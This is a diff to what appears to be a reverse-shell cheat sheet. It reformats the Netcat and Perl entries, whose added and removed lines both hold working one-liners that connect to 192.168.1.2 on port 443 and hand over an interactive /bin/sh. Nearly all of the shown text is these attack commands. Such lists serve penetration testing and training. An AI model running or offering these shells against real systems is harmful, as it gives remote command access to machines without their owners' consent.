@@ -7,7 +7,7 @@
 * Netcat
 
   ```bash
-  nc -e /bin/sh 192.168.1.2 443 &
+  nc -e /bin/sh 192.168.1.2 443
 
   nc -e /bin/bash 192.168.1.2 443
 
@@ -20,7 +20,9 @@
 
 * Perl
 
-  ```perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
+  ```bash
+  perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+  ```
 
 * Python
 
